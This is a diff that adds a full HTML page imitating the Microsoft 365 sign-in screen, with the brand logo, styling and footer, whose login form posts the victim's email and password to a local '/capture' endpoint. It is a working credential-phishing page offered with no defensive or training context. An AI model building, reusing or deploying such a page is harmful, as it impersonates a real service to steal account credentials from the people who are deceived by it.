@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to your account</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:#f2f2f2;font-family:'Segoe UI',Helvetica,Arial,sans-serif;display:flex;flex-direction:column;min-height:100vh}
+  .header{padding:16px 24px}
+  .header svg{height:23px}
+  .wrap{flex:1;display:flex;justify-content:center;align-items:center;padding:20px}
+  .card{background:#fff;width:440px;padding:44px 44px 36px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+  .ms-logo{display:flex;align-items:center;gap:10px;margin-bottom:28px}
+  .ms-logo span{font-size:1.35rem;font-weight:600;color:#1b1b1b}
+  h1{font-size:1.5rem;font-weight:400;color:#1b1b1b;margin-bottom:12px}
+  .subtitle{font-size:.875rem;color:#605e5c;margin-bottom:28px}
+  .field{position:relative;margin-bottom:4px}
+  .field input{
+    width:100%;border:1px solid #8a8886;padding:9px 8px 8px;
+    font-size:.9375rem;font-family:inherit;outline:none;
+    background:#fff;color:#1b1b1b;transition:border .1s
+  }
+  .field input:focus{border-color:#0078d4;border-width:2px;padding:8px 7px 7px}
+  .field input::placeholder{color:#605e5c}
+  .err{color:#a80000;font-size:.75rem;margin:4px 0 12px;display:none}
+  .forgot{display:block;font-size:.8125rem;color:#0067b8;text-decoration:none;margin:16px 0 0}
+  .forgot:hover{text-decoration:underline}
+  .actions{display:flex;justify-content:space-between;align-items:center;margin-top:28px}
+  .link-btn{font-size:.875rem;color:#0067b8;text-decoration:none;background:none;border:none;cursor:pointer;padding:0;font-family:inherit}
+  .link-btn:hover{text-decoration:underline}
+  .btn{background:#0078d4;color:#fff;border:none;padding:6px 20px;font-size:1rem;cursor:pointer;font-family:inherit;min-width:108px;height:36px}
+  .btn:hover{background:#005a9e}
+  .btn:active{background:#004578}
+  .footer{text-align:center;padding:12px;font-size:.75rem}
+  .footer a{color:#0067b8;text-decoration:none;margin:0 8px}
+  .footer a:hover{text-decoration:underline}
+  .divider{color:#aaa;margin:0 2px}
+</style>
+</head>
+<body>
+<div class="header">
+  <svg viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
+    <path fill="#f25022" d="M1 1h10v10H1z"/>
+    <path fill="#7fba00" d="M12 1h10v10H12z"/>
+    <path fill="#00a4ef" d="M1 12h10v10H1z"/>
+    <path fill="#ffb900" d="M12 12h10v10H12z"/>
+  </svg>
+</div>
+<div class="wrap">
+  <div class="card">
+    <div class="ms-logo">
+      <svg viewBox="0 0 23 23" height="20" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#f25022" d="M1 1h10v10H1z"/>
+        <path fill="#7fba00" d="M12 1h10v10H12z"/>
+        <path fill="#00a4ef" d="M1 12h10v10H1z"/>
+        <path fill="#ffb900" d="M12 12h10v10H12z"/>
+      </svg>
+      <span>Microsoft</span>
+    </div>
+    <h1>Sign in</h1>
+    <p class="subtitle">to continue to Microsoft 365</p>
+    <form method="POST" action="/capture" autocomplete="on">
+      <div class="field">
+        <input name="email" type="email" placeholder="Email, phone, or Skype" required autocomplete="username">
+      </div>
+      <div class="field" style="margin-top:16px">
+        <input name="password" type="password" placeholder="Password" required autocomplete="current-password">
+      </div>
+      <a href="#" class="forgot">Forgot password?</a>
+      <div class="actions">
+        <a href="https://signup.live.com" class="link-btn" tabindex="-1">Create one!</a>
+        <button class="btn" type="submit">Sign in</button>
+      </div>
+    </form>
+  </div>
+</div>
+<div class="footer">
+  <a href="#">Terms of use</a><span class="divider">|</span>
+  <a href="#">Privacy & cookies</a><span class="divider">|</span>
+  <a href="#">...</a>
+</div>
+</body>
+</html>
